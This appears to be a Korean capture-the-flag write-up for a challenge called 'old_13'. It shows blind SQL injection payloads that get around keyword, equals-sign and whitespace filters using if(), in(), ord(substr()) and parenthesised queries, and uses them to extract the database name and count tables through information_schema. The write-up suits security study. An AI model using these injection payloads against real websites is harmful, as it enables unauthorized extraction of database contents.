## old_13

filter : union, #, *, limit, like, 논리/비교연산자, +, -, 공백문자, where ...etc

select id from chall13 where no=if( ,1,0)

if(( )in(),1,0)

![chrome_KWeFLMHC9D](https://user-images.githubusercontent.com/79683414/145674374-a0c31535-c703-4994-afbb-19e9d0cff6f6.png)

'='이 필터링 되므로 'in'사용

in : or 여러개

ex) where number in (1,3,5,7,9) / where number in (select ~~)



데이터 베이스명 알아내기(길이>1글자씩)

if(length(database())in(7),1,0)

if(substr(database(),1,1)in("c"),1,0) > 실패

if(ord(substr(database(),1,1))in(99),1,0)

if(ord(substr(database(),7,1))in(51),1,0)

chall13 = 99,104,97,108,108,49,51



아래와 같은 쿼리를 날리고 싶을 때,

select id from test where flag=123123;

where 이 필터링 되므로 `if()`을 사용,

=> select if(flag=123123,id,null) from test;

"=" 이 필터링 되므로 `in()` 을 사용,

=> select if(flag in (123123), id,null) from test;

공백이 필터링 되므로 `()`을 사용,

=> select(if((flag)in(123123),id,null))from(test);



테이블명 알아내기

select table_name from information_schema.tables where table_schema="chall13";

`select table_name` , `where table_schema="chall13"`

=>if(table_schema in (database()), table_name, 0) 

= if((table_schema)in(database(),table_name,0))

최종적으로,

select(if((table_schema)in(database(),table_name,0)))from(information_schema.tables) : table_name 을 반환

select(count(위의 쿼리)) 를 날리면 "chall13"데이터베이스에 몇 개의 테이블이 존재하는지 확인할 수 있다.



테이블 개수 확인

if((select(count(if((table_schema)in(database()),table_name,0)))from(information_schema.tables))in(2),1,0)

